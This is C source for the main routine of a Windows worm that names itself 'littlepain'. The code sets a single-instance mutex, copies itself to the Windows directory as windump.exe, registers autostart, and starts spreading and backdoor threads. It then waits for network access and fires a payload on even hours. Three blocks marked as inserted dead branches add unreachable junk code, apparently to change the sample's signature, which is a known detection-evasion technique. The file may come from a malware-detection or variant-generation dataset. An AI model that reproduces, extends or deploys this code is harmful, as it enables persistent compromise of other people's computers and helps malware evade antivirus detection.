#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stdlib.h>   // added for malloc/free

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char my_path[MAX_PATH], new_path[MAX_PATH];
    DWORD ThreadID;
    WSADATA wsa;
    SYSTEMTIME time;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char comp_buf[64];
        DWORD comp_len = sizeof(comp_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetComputerNameA(comp_buf, &comp_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= comp_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(comp_buf, 0, sizeof(comp_buf));
        }
    }

    CreateMutexA(NULL, FALSE, "__[__ littlepain by [WarGame,#eof] __]__");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }

    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    GetWindowsDirectoryA(new_path, MAX_PATH);
    strcat(new_path, "\\windump.exe");
    CopyFileA(my_path, new_path, FALSE);
    _AutoStart((BYTE*)new_path);

    if (WSAStartup(MAKEWORD(1,1), &wsa) != 0)
    {
        return 0;
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_L0cal_4, new_path, 0, &ThreadID);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_BackDoor_4, NULL, 0, &ThreadID);

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        char *tmp = (char *)malloc(64);
        if (tmp != NULL) {
            strcpy(tmp, "dummy");
            volatile DWORD len = strlen(tmp);
            volatile BYTE check = 0;
            for (volatile DWORD i = 0; i < len; i++) {
                check ^= tmp[i];
            }
            volatile DWORD j = 0;
            while (j < 2) {
                check += j;
                j++;
            }
            char tmp2[32];
            memcpy(tmp2, tmp, 4);
            volatile DWORD val = (DWORD)tmp2[0] + check;
            val += len;
            free(tmp);
        }
    }

    while (!gethostbyname("www.freetibet.org"))
    {
        Sleep(1000*60*20);
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extra, new_path, 0, &ThreadID);

    GetSystemTime(&time);
    if (time.wHour % 2 == 0)
    {
        _Payload();
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    Sleep(INFINITE);
    return 0;
}
